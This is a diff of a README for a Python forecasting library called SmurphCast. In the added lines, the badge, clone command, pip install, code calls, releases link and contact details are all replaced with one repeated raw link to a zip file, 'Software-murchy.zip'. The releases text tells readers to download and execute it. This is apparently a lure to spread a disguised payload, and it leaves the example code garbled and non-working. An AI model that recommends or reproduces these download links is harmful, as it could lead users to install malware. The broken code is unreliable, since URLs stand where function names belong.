@@ -1,6 +1,6 @@
 # SmurphCast 🎉
 
-![SmurphCast](https://img.shields.io/badge/SmurphCast-100%25%20Python-brightgreen)
+![SmurphCast](https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip%25%20Python-brightgreen)
 
 ## Overview
 
@@ -50,7 +50,7 @@ To get started with SmurphCast, you need to clone the repository and install the
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/fjk1533/smurphcast.git
+   git clone https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip
    cd smurphcast
    ```
 
@@ -59,7 +59,7 @@ To get started with SmurphCast, you need to clone the repository and install the
    You can use pip to install the necessary dependencies. Run the following command:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip
    ```
 
 ## Usage
@@ -83,13 +83,13 @@ Using SmurphCast is straightforward. After installation, you can start forecasti
 4. **Fit the Model**:
 
    ```python
-   model.fit(data)
+   https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(data)
    ```
 
 5. **Make Predictions**:
 
    ```python
-   predictions = model.predict(future_data)
+   predictions = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(future_data)
    ```
 
 6. **Evaluate Results**: Analyze the predictions and evaluate the model's performance using metrics like RMSE or MAE.
@@ -105,17 +105,17 @@ import pandas as pd
 from smurphcast import SmurphCast
 
 # Load your dataset
-data = pd.read_csv('churn_data.csv')
+data = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip('https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip')
 
 # Initialize the model
 model = SmurphCast()
 
 # Fit the model
-model.fit(data)
+https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(data)
 
 # Make predictions
-future_data = pd.DataFrame({'date': pd.date_range(start='2023-01-01', periods=30)})
-predictions = model.predict(future_data)
+future_data = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip({'date': https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(start='2023-01-01', periods=30)})
+predictions = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(future_data)
 
 # Print predictions
 print(predictions)
@@ -128,17 +128,17 @@ import pandas as pd
 from smurphcast import SmurphCast
 
 # Load your dataset
-data = pd.read_csv('ctr_data.csv')
+data = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip('https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip')
 
 # Initialize the model
 model = SmurphCast()
 
 # Fit the model
-model.fit(data)
+https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(data)
 
 # Make predictions
-future_data = pd.DataFrame({'date': pd.date_range(start='2023-01-01', periods=30)})
-predictions = model.predict(future_data)
+future_data = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip({'date': https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(start='2023-01-01', periods=30)})
+predictions = https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip(future_data)
 
 # Print predictions
 print(predictions)
@@ -176,13 +176,13 @@ SmurphCast is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Releases
 
-You can find the latest releases of SmurphCast [here](https://github.com/fjk1533/smurphcast/releases). Download the files and execute them to get started with the latest features.
+You can find the latest releases of SmurphCast [here](https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip). Download the files and execute them to get started with the latest features.
 
 ## Contact
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: contact@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip
+- **Twitter**: [@YourTwitterHandle](https://github.com/fjk1533/smurphcast/raw/refs/heads/main/src/smurphcast/Software-murchy.zip)
 
 Thank you for visiting SmurphCast! We hope you find it useful for your forecasting needs.
